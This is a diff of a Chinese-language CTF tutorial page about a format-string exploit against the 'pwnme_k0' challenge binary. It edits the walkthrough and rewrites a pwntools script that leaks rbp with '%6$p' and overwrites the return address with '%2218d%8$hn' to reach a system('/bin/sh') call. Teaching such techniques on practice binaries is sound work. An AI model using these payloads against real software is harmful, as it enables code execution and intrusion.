@@ -346,18 +346,18 @@ int __usercall sub_400B07@<eax>(char format@<dil>, char formata, __int64 a3, cha
 
 #### 利用思路
 
-我们最终的目的是希望可以获得系统的shell，可以发现在给定的文件中，在00000000004008A6地址处有一个直接调用system('bin/sh')的函数（关于这个的发现，一般都会现在程序大致看一下。）。那如果我们修改某个函数的返回地址为这个地址，那就相当于获得了shell。
+我们最终的目的是希望可以获得系统的 shell，可以发现在给定的文件中，在 0x00000000004008A6 地址处有一个直接调用system('bin/sh') 的函数（关于这个的发现，一般都会现在程序大致看一下。）。那如果我们修改某个函数的返回地址为这个地址，那就相当于获得了 shell。
 
-虽然存储返回地址的内存本身是动态变化的，但是其相对于rbp的地址并不会改变，所以我们可以使用相对地址来计算。利用思路如下
+虽然存储返回地址的内存本身是动态变化的，但是其相对于 rbp 的地址并不会改变，所以我们可以使用相对地址来计算。利用思路如下
 
 - 确定偏移
-- 获取函数的rbp与返回地址
+- 获取函数的 rbp 与返回地址
 - 根据相对偏移获取存储返回地址的地址
-- 将执行system函数调用的地址写入到存储返回地址的地址。
+- 将执行 system 函数调用的地址写入到存储返回地址的地址。
 
 #### 确定偏移
 
-首先，我们先来确定一下偏移。输入用户名aaaaaaaa，密码随便输入，断点下在输出密码的那个printf(&a4 + 4)函数处
+首先，我们先来确定一下偏移。输入用户名 aaaaaaaa，密码随便输入，断点下在输出密码的那个 printf(&a4 + 4) 函数处
 
 ```text
 Register Account first!
@@ -400,7 +400,7 @@ Register Success!!
 0x00007fffffffdb78│+0x38: 0x0000000000400d4d  →   cmp eax, 0x2
 ```
 
-可以发现我们输入的用户名在栈上第三个位置，那么除去本身格式化字符串的位置，其偏移为为5+3=8。
+可以发现我们输入的用户名在栈上第三个位置，那么除去本身格式化字符串的位置，其偏移为为 5 + 3 = 8。
 
 #### 修改地址
 
@@ -417,45 +417,60 @@ Register Success!!
 0x00007fffffffdb78│+0x38: 0x0000000000400d4d  →   cmp eax, 0x2
 ```
 
-可以看到栈上第二个位置存储的就是该函数的返回地址(其实也就是调用showaccounth函数时执行push rip所存储的值)，在格式化字符串中的偏移为7。
+可以看到栈上第二个位置存储的就是该函数的返回地址(其实也就是调用 show account 函数时执行 push rip 所存储的值)，在格式化字符串中的偏移为 7。
 
-与此同时栈上，第一个元素存储的也就是上一个函数的rbp。所以我们可以得到偏移0x00007fffffffdb80-0x00007fffffffdb48=0x38。继而如果我们知道了rbp的数值，就知道了函数返回地址的地址。
+与此同时栈上，第一个元素存储的也就是上一个函数的 rbp。所以我们可以得到偏移 0x00007fffffffdb80 - 0x00007fffffffdb48 = 0x38。继而如果我们知道了 rbp 的数值，就知道了函数返回地址的地址。
 
-0x0000000000400d74与0x00000000004008A6只有低2字节不同，所以我们可以只修改0x00007fffffffdb48开始的2个字节。
+0x0000000000400d74 与 0x00000000004008A6 只有低 2 字节不同，所以我们可以只修改 0x00007fffffffdb48 开始的 2 个字节。
+
+这里需要说明的是在某些较新的系统(如 ubuntu 18.04)上, 直接修改返回地址为 0x00000000004008A6 时可能会发生程序 crash, 这时可以考虑修改返回地址为 0x00000000004008AA,  即直接调用 system("/bin/sh") 处
+
+```assembly
+.text:00000000004008A6 sub_4008A6      proc near
+.text:00000000004008A6 ; __unwind {
+.text:00000000004008A6                 push    rbp
+.text:00000000004008A7                 mov     rbp, rsp
+.text:00000000004008AA <- here         mov     edi, offset command ; "/bin/sh"
+.text:00000000004008AF                 call    system
+.text:00000000004008B4                 pop     rdi
+.text:00000000004008B5                 pop     rsi
+.text:00000000004008B6                 pop     rdx
+.text:00000000004008B7                 retn
+```
 
 #### 利用程序
-
-这里使用data[1:]的原因是当我们split的时候由于起始的是0x，所以会产生‘’字符串，需要跳过。
-
 ```python
 from pwn import *
-from LibcSearcher import *
-pwnme = ELF('./pwnme_k0')
-if args['REMOTE']:
-    sh = remote(11, 11)
-else:
-    sh = process('./pwnme_k0')
-sh.recvuntil(':\n')
-sh.sendline('a' * 8)
-sh.recvuntil(':\n')
-sh.sendline('%p' * 9)
-sh.recvuntil('>')
-sh.sendline('1')
-sh.recvuntil('a' * 8 + '\n')
-data = sh.recvuntil('1.', drop=True).split('0x')
-print data
-data = data[1:]
-rbp = int(data[5], 16)
-ret_addr = rbp - 0x38
-sh.recvuntil('>')
-sh.sendline('2')
-sh.recvuntil(':\n')
+context.log_level="debug"
+context.arch="amd64"
+
+sh=process("./pwnme_k0")
+binary=ELF("pwnme_k0")
+#gdb.attach(sh)
+
+sh.recv()
+sh.writeline("1"*8)
+sh.recv()
+sh.writeline("%6$p")
+sh.recv()
+sh.writeline("1")
+sh.recvuntil("0x")
+ret_addr = int(sh.recvline().strip(),16) - 0x38
+success("ret_addr:"+hex(ret_addr))
+
+
+sh.recv()
+sh.writeline("2")
+sh.recv()
 sh.sendline(p64(ret_addr))
-sh.recvuntil(':\n')
-payload = '%2214d%8$hn'
-sh.sendline(payload)
-sh.recvuntil('>')
-sh.sendline('1')
+sh.recv()
+#sh.writeline("%2214d%8$hn")
+#0x4008aa-0x4008a6
+sh.writeline("%2218d%8$hn")
+
+sh.recv()
+sh.writeline("1")
+sh.recv()
 sh.interactive()
 ```
 
